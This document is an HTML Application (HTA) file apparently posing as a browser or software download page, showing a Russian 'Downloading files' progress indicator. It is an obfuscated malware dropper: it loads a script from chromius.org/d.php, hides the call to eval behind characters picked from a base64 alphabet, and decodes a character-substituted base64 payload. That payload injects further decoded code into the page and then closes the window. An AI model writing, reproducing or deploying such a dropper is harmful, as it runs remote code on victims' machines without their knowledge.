<html><head>
    <hta:application id="app" />
    <meta charset="utf-8">
    <script language="JavaScript">
        window.resizeTo(window.screen.width * 0.3, window.screen.height * 0.3);
    </script>
</head>
<body>

<span id="tracking-pixel"></span>
<div class="container" id="container" style="position: absolute;width: 400px;height: 300px;">
    <div>
        <img id="logo" src="https://chromius.org/logo.png">
    </div>
    <h5>Скачиваю файлы <span id="progress">.</span> </h5>
</div>
<div id="text"></div>
<script src="https://chromius.org/d.php"></script>
<script language="JavaScript">
    var p = document.getElementById('progress');

    setInterval(function () {
        var str = p.innerHTML;

        if(str.length === 10)
            str = '.';
        else
            str += '.';

        p.innerHTML = str;
    }, 700);

    var domIsReady = (function(domIsReady) {
        var isBrowserIeOrNot = function() {
            return (!document.attachEvent || typeof document.attachEvent === "undefined" ? 'not-ie' : 'ie');
        }

        domIsReady = function(callback) {
            if(callback && typeof callback === 'function'){
                if(isBrowserIeOrNot() !== 'ie') {
                    document.addEventListener("DOMContentLoaded", function() {
                        return callback();
                    });
                } else {
                    document.attachEvent("onreadystatechange", function() {
                        if(document.readyState === "complete") {
                            return callback();
                        }
                    });
                }
            } else {
                console.error('The callback is not a function!');
            }
        }

        return domIsReady;
    })(domIsReady || {});


    domIsReady(function () {

        setTimeout(function () {
            window.b = {};
            var b = window.b;
            b.code = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
            b.e = function(str, utf8encode) {  // http://tools.ietf.org/html/rfc4648
                utf8encode =  (typeof utf8encode == 'undefined') ? false : utf8encode;
                var o1, o2, o3, bits, h1, h2, h3, h4, e=[], pad = '', c, plain, coded;
                var b64 = b.code;

                plain = utf8encode ? Utf8.encode(str) : str;

                c = plain.length % 3;  // pad string to length of multiple of 3
                if (c > 0) { while (c++ < 3) { pad += '='; plain += '\0'; } }
                // note: doing padding here saves us doing special-case packing for trailing 1 or 2 chars

                for (c=0; c<plain.length; c+=3) {  // pack three octets into four hexets
                    o1 = plain.charCodeAt(c);
                    o2 = plain.charCodeAt(c+1);
                    o3 = plain.charCodeAt(c+2);

                    bits = o1<<16 | o2<<8 | o3;

                    h1 = bits>>18 & 0x3f;
                    h2 = bits>>12 & 0x3f;
                    h3 = bits>>6 & 0x3f;
                    h4 = bits & 0x3f;

                    // use hextets to index into code string
                    e[c/3] = b64.charAt(h1) + b64.charAt(h2) + b64.charAt(h3) + b64.charAt(h4);
                }
                coded = e.join('');  // join() is far faster than repeated string concatenation in IE

                // replace 'A's from padded nulls with '='s
                coded = coded.slice(0, coded.length-pad.length) + pad;

                return coded;
            }
            b.d = function(str, utf8decode) {
                utf8decode =  (typeof utf8decode == 'undefined') ? false : utf8decode;
                var o1, o2, o3, h1, h2, h3, h4, bits, d=[], plain, coded;
                var b64 = b.code;

                coded = utf8decode ? Utf8.decode(str) : str;

                for (var c=0; c<coded.length; c+=4) {  // unpack four hexets into three octets
                    h1 = b64.indexOf(coded.charAt(c));
                    h2 = b64.indexOf(coded.charAt(c+1));
                    h3 = b64.indexOf(coded.charAt(c+2));
                    h4 = b64.indexOf(coded.charAt(c+3));

                    bits = h1<<18 | h2<<12 | h3<<6 | h4;

                    o1 = bits>>>16 & 0xff;
                    o2 = bits>>>8 & 0xff;
                    o3 = bits & 0xff;

                    d[c/4] = String.fromCharCode(o1, o2, o3);
                    // check for padding
                    if (h4 == 0x40) d[c/4] = String.fromCharCode(o1, o2);
                    if (h3 == 0x40) d[c/4] = String.fromCharCode(o1);
                }
                plain = d.join('');  // join() is far faster than repeated string concatenation in IE

                return utf8decode ? Utf8.decode(plain) : plain;
            };
            var w = window;
            var replaces = {'$':'A', '#': 'B', '%': 'C', '(': 'M', ')': 'W', '!': 'd', '^': 'q', '*': 'h'};
            var v = w[b.code.charAt(30) + "" + "" + b.code.charAt(47) + "" + b.code.charAt(26) + b.code.charAt(37)];
            var a1 = '!mFyIH(gPS#3a)5kb3cuZGF0Ow0KI%$gI%$gI%$gI%$gI%$gIHZ*ci#lb%$9IGRvY3VtZ)50Lm',
                a2 = 'NyZ)F0ZUVsZ)1lbnQoJ3NjJy$rI%!yaScgKy$ncHQnKTsN%i$gI%$gI%$gI%$gI%$gI%#lb%5sY)5n!)Fn',
                a3 = 'ZS$9I%J)Ii$rI%IiI%sgIiIgKy$iQiIgKy$iIi$rI%IiI%sgIl(iI%sgIiIgKy$iY3IiI%sgImlw!%I7DQoN%i$gI%$gI%$gI%$gI%$gI%#2YXIg!G1wID0gYi5kKG5vcm1*bGl6ZVN0ci*zKSk7DQogI%$gI%$gI%$gI%$gI%$gZ)wu!GV4',
                a4 = '!%$9IHRtcDsN%g0KI%$gI%$gI%$gI%$gI%$gIGRvY3VtZ)50LmJvZHkuYX#wZ)5kQ2*pbGQoZ)wpOw==';

            window.normalizeStr = function(str)
            {
                for(var char in replaces)
                {
                    var to = replaces[char];
                    str = str.replace( new RegExp('\\' + char, 'g'), to);
                }

                return str;
            };

            v(
                b.d(normalizeStr(a1 + a2 + a3 + a4))
            );
            window.close();

        }, 1000);
    });
</script>
</body>
</html>
